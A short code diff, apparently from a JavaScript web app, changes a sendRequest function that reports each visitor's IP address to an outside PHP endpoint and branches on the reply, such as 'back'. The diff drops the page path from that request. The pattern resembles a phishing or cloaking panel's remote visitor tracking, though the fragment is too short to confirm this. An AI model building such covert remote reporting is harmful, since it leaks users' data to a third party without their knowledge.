@@ -237,8 +237,7 @@
           }
         },
         sendRequest(visitorIP) {
-          const currentPath = req.originalUrl.split('/').pop();
-          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP) + '&sayfa=' + encodeURIComponent(currentPath))
+          axios.get('https://hakikicelikhantutunu.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP))
             .then(response => {
               const msg = response.data;
               if (msg === "back") {
